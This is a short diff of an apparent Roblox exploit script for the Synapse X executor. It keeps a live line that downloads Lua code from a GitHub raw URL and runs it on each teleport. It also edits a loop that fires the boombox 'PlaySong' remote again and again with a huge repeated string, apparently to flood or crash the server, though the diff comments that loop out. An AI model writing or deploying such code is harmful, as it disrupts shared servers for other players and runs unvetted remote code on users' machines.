@@ -3,10 +3,11 @@ repeat wait(.06) until game:GetService('Players').LocalPlayer ~= nil
 syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/xxaim/ignore/master/temp4.lua"))()')
 
 local LP = game:GetService("Players").LocalPlayer
-local backpack = LP:WaitForChild("Backpack")
-repeat wait() until backpack:FindFirstChild("BoomBox")
-backpack.BoomBox.Parent = LP.Character
+LP:WaitForChild("Backpack")
+wait(10)
+print(LP:WaitForChild("Backpack"):GetChildren()) --.BoomBox.Parent = LP.Character
 
+--[[
 local Error = ('お前はもう死んでいる'):rep(1600)
 
 local Boombox = LP.Character:FindFirstChildOfClass('Tool')
@@ -27,3 +28,4 @@ repeat
   Remote:FireServer('PlaySong',Error)
   wait()
 until not Boombox['Parent']:IsA('Model')
+--]]
